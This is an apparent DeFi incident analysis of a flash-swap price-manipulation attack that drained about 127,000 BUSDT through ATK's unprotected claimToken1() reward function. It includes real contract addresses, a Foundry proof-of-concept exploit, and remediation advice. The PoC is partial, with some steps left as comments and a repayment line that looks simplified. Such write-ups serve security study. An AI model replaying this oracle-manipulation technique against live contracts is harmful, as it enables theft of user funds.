# ATK — Flash Swap + claimToken1() Reward Theft Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-10 |
| **Protocol** | ATK Token |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~127,000 BUSDT |
| **Vulnerable Contract** | [0x9cb928bf50ed220ac8f703bce35be5ce7f56c99c](https://bscscan.com/address/0x9cb928bf50ed220ac8f703bce35be5ce7f56c99c) |
| **Attack Contract** | [0xd7ba198ce82f4c46ad8f6148ccfdb41866750231](https://bscscan.com/address/0xd7ba198ce82f4c46ad8f6148ccfdb41866750231) |
| **Auxiliary Contract** | [0x96bf2e6cc029363b57ffa5984b943f825d333614](https://bscscan.com/address/0x96bf2e6cc029363b57ffa5984b943f825d333614) |
| **Attacker** | [0x3DF6cd58716d22855aFb3B828F82F10708AfbB4f](https://bscscan.com/address/0x3DF6cd58716d22855aFb3B828F82F10708AfbB4f) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **Root Cause** | `getPrice()` returns a manipulable AMM spot price; `claimToken1()` has no access control |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-10/ATK_exp.sol) |

---
## 1. Vulnerability Overview

The ATK token protocol read AMM pair spot prices via the `getPrice()` function and used them in reward claim logic. The attacker flash-swapped a large amount of ATK from the ATK-BUSDT pair to manipulate the price, then called `claimToken1()` on the auxiliary contract to extract an excessive BUSDT reward. The `claimToken1()` function had no caller validation, allowing any arbitrary contract to claim rewards on behalf of others.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable getPrice() - returns AMM spot price
contract ATKToken {
    IUniPair public atkBusdtPair;

    function getPrice() public view returns (uint256) {
        // ❌ Spot price manipulable via flash swap
        (uint112 r0, uint112 r1, ) = atkBusdtPair.getReserves();
        // r0 = ATK, r1 = BUSDT
        return uint256(r1) * 1e18 / uint256(r0);
    }
}

// ❌ Vulnerable claimToken1() - no access control
contract AuxiliaryContract {
    ATKToken public atk;

    function claimToken1() external {
        // ❌ Does not verify that msg.sender is a legitimate beneficiary
        uint256 price = atk.getPrice(); // manipulated price
        uint256 reward = calculateReward(price); // excessive reward calculated
        BUSDT.transfer(msg.sender, reward);
    }
}

// ✅ Correct pattern
contract SafeAuxiliary {
    mapping(address => uint256) public claimable;
    AggregatorV3Interface immutable priceFeed;

    function claimToken1() external {
        // ✅ Only pays out pre-recorded claimable amount
        uint256 amount = claimable[msg.sender];
        require(amount > 0, "Nothing to claim");
        claimable[msg.sender] = 0;
        BUSDT.transfer(msg.sender, amount);
    }
}
```

---
### On-Chain Source Code

Source: Bytecode decompilation


**ATK_decompiled.sol** — entry point:
```solidity
// ❌ Root cause: `getPrice()` returns a manipulable AMM spot price; `claimToken1()` has no access control
    function getPrice() external view returns (uint256) {}  // 0x98d5fdca  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] 2 BNB → BUSDT swap (initial capital)
    │
    ├─[2] Flash swap from ATK-BUSDT pair
    │       enters pancakeCall() callback
    │
    ├─[3] Manipulate price using flash-borrowed ATK
    │       holding large amount of ATK → distorts getPrice() return value
    │
    ├─[4] Call claimToken1() on auxiliary contract
    │       ❌ No access control
    │       ❌ Excessive reward calculated based on manipulated getPrice()
    │       → Receives large amount of BUSDT
    │
    ├─[5] Repay flash swap with borrowed ATK → BUSDT
    │
    └─[6] Net profit: 127,000 BUSDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface IAux {
    function claimToken1() external;
}

interface IUniPair {
    function swap(uint256, uint256, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
}

contract ATKExploit is Test {
    IAux aux      = IAux(0x96bf2e6cc029363b57ffa5984b943f825d333614);
    IUniPair pair = IUniPair(0x9cb928bf50ed220ac8f703bce35be5ce7f56c99c);
    IERC20 BUSDT  = IERC20(0x55d398326f99059fF775485246999027B3197955);

    function setUp() public {
        vm.createSelectFork("bsc", 22_102_838);
        vm.deal(address(this), 2 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] BUSDT balance", BUSDT.balanceOf(address(this)), 18);

        // [Step 1] BNB → BUSDT
        // (via PancakeRouter)

        // [Step 2] Flash swap from ATK-BUSDT pair
        (uint112 r0, , ) = pair.getReserves();
        pair.swap(uint256(r0) * 80 / 100, 0, address(this), abi.encode("exploit"));

        emit log_named_decimal_uint("[End] BUSDT balance", BUSDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 3] Manipulate getPrice() using flash-borrowed ATK

        // [Step 4] claimToken1() - no access control
        // ⚡ Receives excessive BUSDT reward based on manipulated price
        aux.claimToken1();

        // [Step 5] Repay flash swap
        uint256 repay = amount0 * 1003 / 1000 + 1;
        // Swap ATK to BUSDT and repay
        BUSDT.transfer(address(pair), repay);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | AMM spot price manipulation + reward claim with no access control |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **OWASP DeFi** | Flash loan-based oracle manipulation |
| **Attack Vector** | Flash swap → `getPrice()` manipulation → `claimToken1()` |
| **Preconditions** | `getPrice()` uses AMM spot price; `claimToken1()` has no access control |
| **Impact** | 127,000 BUSDT loss |

---
## 6. Remediation Recommendations

1. **Use TWAP or an external oracle**: Replace `getPrice()` with Chainlink or a time-weighted average price (TWAP).
2. **Pre-compute and record rewards**: Do not calculate rewards in real time on-chain; instead compute them off-chain or in a separate transaction and record them in a `claimable[user]` mapping.
3. **Protect `claimToken1()`**: Pay out only from the claimable amount mapping, and zero out the balance before transferring (CEI pattern).

---
## 7. Lessons Learned

- **Never use AMM spot prices in reward calculations**: AMM prices can be distorted within a single transaction via flash loans, so AMM spot prices must not be used directly in reward or lending logic.
- **Auxiliary contracts are first-class attack targets**: Auxiliary/utility contracts connected to the main contract must be held to the same security standards.